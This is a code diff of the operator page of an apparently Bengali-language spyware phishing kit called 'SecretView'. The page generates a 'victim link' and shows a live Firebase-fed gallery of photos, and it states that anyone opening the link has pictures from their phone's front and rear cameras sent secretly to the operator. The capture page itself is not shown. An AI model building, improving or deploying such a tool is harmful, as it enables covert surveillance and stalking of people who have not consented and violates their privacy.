@@ -3,44 +3,64 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>LiveSnap • লাইভ ছবি দেখুন</title>
+<title>SecretView • গোপন ছবি লাইভ</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700;800&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:Arial,sans-serif;background:#fff;color:#222}
-header{background:#000;padding:30px;text-align:center}
-.logo{height:90px;border-radius:50%;border:4px solid #ff0050}
-.container{max-width:900px;margin:40px auto;padding:20px;text-align:center}
-h1{font-size:2.8em;color:#ff0050;margin:20px 0}
-.btn{background:#ff0050;color:#fff;padding:16px 50px;font-size:1.4em;border:none;border-radius:50px;cursor:pointer;margin:15px}
-#linkBox{display:none;margin:40px auto;padding:30px;background:#f9f9f9;border:2px dashed #ff0050;border-radius:20px;max-width:700px}
-#victimLink{width:100%;padding:15px;font-size:1.2em;border:1px solid #ddd;border-radius:10px;margin:15px 0;word-break:break-all;background:#fff}
-.gallery{margin-top:60px}
-.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-top:20px}
-.grid img{width:100%;border-radius:12px;border:3px solid #ff0050;box-shadow:0 5px 15px rgba(0,0,0,0.2);cursor:pointer}
-.noimg{color:#888;font-size:1.5em;margin:50px}
+body{font-family:'Poppins',sans-serif;background:linear-gradient(135deg,#f5f7fa,#c3cfe2);color:#222;min-height:100vh}
+header{background:#000;padding:25px 0;text-align:center;box-shadow:0 4px 15px rgba(0,0,0,0.2)}
+.logo{height:90px;border-radius:50%;border:4px solid #ff0050;animation:pulse 3s infinite}
+@keyframes pulse{0%,100%{box-shadow:0 0 20px #ff0050}50%{box-shadow:0 0 40px #ff0050}}
+.container{max-width:950px;margin:30px auto;padding:20px;text-align:center}
+.thumb{max-width:700px;width:100%;border-radius:20px;margin:30px auto;box-shadow:0 15px 40px rgba(0,0,0,0.2);border:3px solid #fff}
+h1{font-size:3.2em;margin:20px 0;background:linear-gradient(45deg,#ff0050,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:800}
+p{font-size:1.3em;color:#444;margin:15px auto;max-width:700px}
+.btn{background:#ff0050;color:#fff;padding:18px 60px;font-size:1.5em;border:none;border-radius:50px;cursor:pointer;margin:15px;font-weight:bold;box-shadow:0 10px 30px rgba(255,0,80,0.4);transition:.3s}
+.btn:hover{transform:translateY(-8px);box-shadow:0 20px 40px rgba(255,0,80,0.6)}
+#linkBox{display:none;margin:50px auto;padding:35px;background:#fff;border-radius:20px;max-width:750px;box-shadow:0 15px 40px rgba(0,0,0,0.15);border:3px dashed #ff0050}
+#victimLink{width:100%;padding:18px;font-size:1.3em;border:2px solid #ff0050;border-radius:15px;background:#fff;color:#d00040;font-weight:bold;text-align:center;margin:20px 0;word-break:break-all}
+.gallery{margin-top:80px;background:#fff;padding:40px 20px;border-radius:25px;box-shadow:0 10px 30px rgba(0,0,0,0.1)}
+.gallery h2{font-size:2.3em;color:#ff0050;margin-bottom:30px}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:25px}
+.grid img{width:100%;height:220px;object-fit:cover;border-radius:18px;border:5px solid #ff0050;box-shadow:0 10px 25px rgba(0,0,0,0.3);transition:.4s;cursor:pointer}
+.grid img:hover{transform:scale(1.08);box-shadow:0 20px 40px rgba(255,0,80,0.5)}
+.noimg{color:#888;font-size:1.7em;padding:60px;background:#f9f9f9;border-radius:20px}
+footer{text-align:center;padding:40px;background:#000;color:#fff;margin-top:100px;font-size:1.1em}
+footer a{color:#ff0050;text-decoration:none;font-weight:bold}
 </style>
 </head>
 <body>
 
-<header><img src="https://i.ibb.co.com/5YZpX7K/logo.png" class="logo" alt="Logo"></header>
+<header>
+  <img src="https://i.ibb.co.com/5YZpX7K/logo.png" alt="Logo" class="logo">
+</header>
 
 <div class="container">
+  <!-- ইউটিউব থাম্বনেইল -->
+  <img src="https://i.ibb.co.com/4pJ3T1F/thumb.jpg" alt="Demo Video" class="thumb">
+
   <h1>গোপনে লাইভ ছবি দেখুন</h1>
-  <p>লিংক শেয়ার করুন → কেউ খুললেই ছবি এখানে চলে আসবে!</p>
-  <button class="btn" onclick="generateLink()">নতুন লিংক তৈরি করুন</button>
+  <p>লিংক শেয়ার করুন → কেউ খুললেই তার ফোনের সামনে + পিছনে ক্যামেরা থেকে ছবি এখানে চলে আসবে!</p>
+
+  <button class="btn" onclick="generateLink()">নতুন গোপন লিংক তৈরি করুন</button>
 
   <div id="linkBox">
-    <h3 style="color:#ff0050">তোমার লিংক রেডি!</h3>
+    <h2 style="color:#ff0050;margin-bottom:20px">তোমার লিংক রেডি!</h2>
     <input type="text" id="victimLink" readonly>
+    <br><br>
     <button class="btn" onclick="copyLink()">কপি করুন</button>
   </div>
 
   <div class="gallery">
-    <h2 style="color:#ff0050">লাইভ ছবি</h2>
-    <div class="noimg" id="noimg">এখনো কোনো ছবি আসেনি...</div>
+    <h2>লাইভ ছবি গ্যালারি</h2>
+    <div class="noimg" id="noimg">এখনো কোনো ছবি আসেনি। লিংক শেয়ার করুন!</div>
     <div class="grid" id="grid"></div>
   </div>
 </div>
+
+<footer>
+  © 2025 COPYRIGHT BY <a href="#">X4XOR</a> · ATI LINKABLE THAKBE
+</footer>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
@@ -59,7 +79,7 @@ let currentId = null;
 
 function generateLink(){
   currentId = Date.now().toString(36);
-  const base = location.href.split('/').slice(0,-1).join('/') + '/';
+  const base = location.origin + location.pathname.replace('index.html','');
   const link = base + "view.html?id=" + currentId;
   document.getElementById("linkBox").style.display = "block";
   document.getElementById("victimLink").value = link;
@@ -68,9 +88,9 @@ function generateLink(){
   loadPhotos();
 }
 function copyLink(){
-  const input = document.getElementById("victimLink");
-  input.select(); document.execCommand("copy");
-  alert("কপি হয়ে গেছে!");
+  const inp = document.getElementById("victimLink");
+  inp.select(); document.execCommand("copy");
+  alert("লিংক কপি হয়ে গেছে!");
 }
 function loadPhotos(){
   if(!currentId) return;
@@ -80,11 +100,11 @@ function loadPhotos(){
     grid.innerHTML = "";
     if(s.val()){
       noimg.style.display = "none";
-      Object.values(s.val()).reverse().forEach(img=>{
-        const i = document.createElement("img");
-        i.src = img.data;
-        i.onclick = ()=>window.open(img.data);
-        grid.appendChild(i);
+      Object.values(s.val()).reverse().forEach(p=>{
+        const img = document.createElement("img");
+        img.src = p.data;
+        img.onclick = () => window.open(p.data, "_blank");
+        grid.appendChild(img);
       });
     }
   });
